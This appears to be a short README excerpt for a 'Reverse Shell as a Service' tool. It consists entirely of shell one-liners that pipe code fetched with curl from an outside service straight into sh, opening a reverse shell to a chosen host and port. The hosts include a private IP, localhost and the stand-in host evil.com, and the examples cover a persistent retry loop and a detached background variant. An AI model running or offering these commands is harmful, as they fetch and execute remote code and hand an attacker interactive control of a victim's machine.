...
> Reverse Shell as a Service - https://shell.vercel.com
...
```shell
curl https://shell.vercel.com/api/192.168.0.69:1337 | sh
```
...
```shell
curl https://shell.vercel.com/api/localhost:1337 | sh
```
...
```shell
curl https://shell.vercel.com/api/evil.com:1337 | sh
```
...
```shell
while true; do curl https://shell.vercel.com/api/yourip:1337 | sh; done
```
...
```shell
sh -c "curl https://shell.vercel.com/api/localhost:1337 | sh -i &" && exit
```
